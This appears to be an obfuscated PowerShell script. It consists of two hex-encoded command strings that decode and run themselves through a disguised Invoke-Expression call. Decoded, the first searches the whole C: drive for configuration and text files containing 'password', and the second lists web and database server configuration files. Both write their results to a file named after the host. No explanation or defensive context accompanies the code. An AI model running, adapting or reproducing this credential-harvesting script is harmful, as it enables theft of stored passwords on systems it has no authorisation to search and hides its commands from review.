"$(Set-Item 'VaRIable:ofS'  '') " + [StrInG]( '47h65h74S2dh43j68j69X6c,64p49X74p65S6dp20X63X3a,2a_20p2d,69X6eh63X6c@75j64S65@20j2e_78_6dS6c@2c,2e_69j6ej69,2cj2eX74h78_74p2c_2eX63j6fh6eX66@69h67h20S2d,52j65@63p75_72,73p65p20,2dS45h72X72j6fS72X41S63h74S69h6fh6eh20,53j69@6c,65_6eX74_6c,79@43,6fS6eh74_69S6e_75@65S20p7c@20@57,68p65h72_65X2dX4fX62S6a@65p63h74@20p7bp24X5f_2ep50@53X50p61j74X68j20h2dh6e_6f,74_6c@69j6b@65S20p22@43h3aS5c@74@65p6dX70,22,20,2dX61h6e,64X20j24,5fj2eX50_53S50,61X72_65,6eS74p50X61S74p68j20S2dS6eh6fh74X6c_69S6b@65S20X22_52X65S66p65,72@65p6eX63h65X20,41@73@73,65p6dS62@6cS69p65X73h22X20,2dX61X6e@64h20_24,5fp2e_50@53p50p61@72p65h6eX74S50_61@74h68,20S2dh6eh6f_74h6c_69@6b,65p20X22_57S69X6e_64X6f,77_73@20_4b@69j74_73p22h7dX7cj20,53S65p6cS65X63,74h2dX53p74h72p69p6e_67h20_2dS50X61p74h74j65h72p6e,20@22@70@61S73@73_77X6fj72h64@22h20_3eX3e,20X2ep5cj24S68X6fh73S74X6ep61,6dj65S2ej74,78j74S3b'-sPLIT'@'-split','-sPlit'X' -spliT 'p'-spLit 'h' -SpLiT'S'-spLit 'j' -SPlIT'_' | %{( [CHaR] ([coNVERt]::toinT16(([STRING]$_ ) ,16 ) ))}) +" $( SeT-iTEM  'VArIaBLe:oFs'  ' ')" | . ( ([StRinG]$vERBoSEPReFeREnCe)[1,3]+'X'-JOin'')
 "$( Set-vARIAble  'Ofs'  '')"+ [stRIng]( (47, 65 ,74,'2d' , 43 , 68 , 69,'6c',64 ,69,74,65 ,'6d',20,'2d' , 50 , 61, 74,68 ,20,43,'3a','5c' ,20 , '2d',49 , '6e',63, '6c', 75, 64,65 ,20 ,70 , 68 , 70 ,'2e', 69 ,'6e' , 69 , '2c', 68, 74, 74, 70,64,'2e',63 ,'6f' , '6e' , 66,'2c',68,74, 74, 70 , 64, '2d',78 ,61, '6d' , 70 , 70 ,'2e' ,63 , '6f' , '6e', 66,'2c','6d' ,79, '2e',69,'6e' , 69, '2c' , '6d', 79, '2e' , 63,'6e' ,66, 20 , '2d', 46 , 69, '6c',65 ,20,'2d', 52, 65 , 63, 75 ,72 ,73 , 65,20, '2d',45,72 ,72,'6f', 72 , 41 , 63 ,74,69,'6f' ,'6e' ,20 ,53 ,69,'6c' ,65, '6e' , 74 ,'6c',79, 43 ,'6f', '6e' ,74, 69 ,'6e' , 75 , 65,20 , '3e' , '3e', 20 ,'2e' ,'5c',24 , 68 ,'6f', 73,74 , '6e' ,61 ,'6d' , 65 ,'2e', 74, 78 , 74,'3b') |%{([cHar]( [CONvERT]::TOint16(( $_.tOsTriNG() ) ,16)))} )+"$( SeT-iTem 'vArIablE:oFs'  ' ' ) "| . ( $VerbosePreFEreNCE.toString()[1,3]+'X'-Join'')